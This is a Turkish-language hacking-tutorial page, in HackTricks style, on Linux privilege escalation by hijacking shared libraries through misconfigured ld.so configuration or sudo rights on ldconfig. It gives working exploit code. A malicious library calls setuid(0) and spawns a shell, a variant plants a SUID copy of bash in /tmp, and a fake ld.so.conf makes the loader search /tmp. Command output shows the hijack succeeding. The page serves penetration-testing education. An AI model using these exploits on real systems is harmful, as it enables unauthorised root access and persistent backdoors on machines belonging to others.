# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Ortamı hazırlayın

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Oluştur** bu dosyaları makinenizde aynı klasörde
2. **Derle** **library**'yi: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`'yi `/usr/lib`'e **kopyala** ve cache'i yenile: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Derle** **executable**'ı: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol et

_check_ `libcustom.so`'nin _/usr/lib_'den **yükleniyor** olduğunu ve binary'yi **execute** edebildiğini doğrula.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Yararlı triage komutları

Gerçek bir hedefe saldırırken, binary’nin ihtiyaç duyduğu **tam kütüphane adını** ve loader’ın **şu anda çözdüğü** şeyi doğrulayın:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Birkaç yararlı gotcha:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz** çünkü
yönlendirme mevcut shell’in tarafından yapılır. Bunun yerine
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary’ler, **secure-execution mode** içinde `LD_LIBRARY_PATH`/`LD_PRELOAD` değişkenlerini yok sayar; ancak `/etc/ld.so.conf` içinden gelen dizinler hâlâ trusted loader configuration’ın parçasıdır, bu yüzden bu misconfiguration yine de privileged programları etkileyebilir.
- Daha yeni glibc sürümlerinde dynamic loader ayrıca `--list-diagnostics` sunar; bu, hijack beklenildiği gibi davranmadığında cache resolution ve `glibc-hwcaps` alt dizin seçimini debug etmek için kullanışlıdır.

## Exploit

Bu senaryoda, _/etc/ld.so.conf/_ içindeki bir dosyada vulnerable bir entry oluşturulduğunu varsayacağız:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Vulnerable klasör _/home/ubuntu/lib_’dir (burada yazma erişimimiz var).\
**Aşağıdaki kodu** bu path içinde **indirin ve compile edin**:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Eğer daha sonra savunmasız binary’yi **root**’un (veya başka ayrıcalıklı bir hesabın) çalıştırmasını bekliyorsanız, genellikle etkileşimli bir shell başlatmak yerine **root-owned artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı yürütme gerçekleştiğinde, `/tmp/rootbash -p` kullanabilirsiniz.

Artık yanlış yapılandırılmış yol içinde **kötü amaçlı libcustom library oluşturduğumuza göre**, bir **reboot** beklememiz ya da root kullanıcısının **`ldconfig`** çalıştırmasını beklememiz gerekiyor (_bu binary’yi **sudo** olarak çalıştırabiliyorsanız ya da **suid bit** varsa, bunu kendiniz çalıştırabilirsiniz_).

Bu gerçekleştiğinde, `sharedvuln` executable’ının `libcustom.so` library’sini nereden yüklediğini tekrar kontrol edin:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi, **onu `/home/ubuntu/lib` içinden yüklüyor** ve herhangi bir kullanıcı bunu çalıştırırsa, bir shell çalıştırılacaktır:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte ayrıcalıkları yükseltmedik, ancak çalıştırılan komutları değiştirip **root veya başka ayrıcalıklı bir kullanıcının zafiyetli binary’i çalıştırmasını bekleyerek** ayrıcalıkları yükseltebileceğiz.

### Other misconfigurations - Same vuln

Önceki örnekte, bir yöneticinin **`/etc/ld.so.conf.d/` içindeki bir configuration file içinde ayrıcalıklı olmayan bir klasör ayarladığı** sahte bir misconfiguration oluşturduk.\
Ancak aynı vulnerability’ye yol açabilecek başka misconfigurations da vardır; **`/etc/ld.so.conf.d`s** içindeki herhangi bir **config file** üzerinde, `/etc/ld.so.conf.d` klasöründe veya `/etc/ld.so.conf` dosyasında **write permissions** varsa, aynı vulnerability’yi yapılandırıp exploit edebilirsiniz.

## Exploit 2

**`ldconfig` üzerinde sudo privileges’a sahip olduğunuzu varsayalım**.\
`ldconfig`’e **conf files’ın nereden yükleneceğini** belirtebilirsiniz; böylece bunu kullanarak `ldconfig`’in arbitrary folders yüklemesini sağlayabiliriz.\
O halde, "/tmp" yüklemek için gereken dosya ve klasörleri oluşturalım:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki exploit**’te belirtildiği gibi, **kötü amaçlı library’yi `/tmp` içinde oluşturun**.\
Ve son olarak, yolu yükleyelim ve binary’nin library’yi nereden yüklediğini kontrol edelim:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olarak aynı zafiyeti istismar edebilirsiniz.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
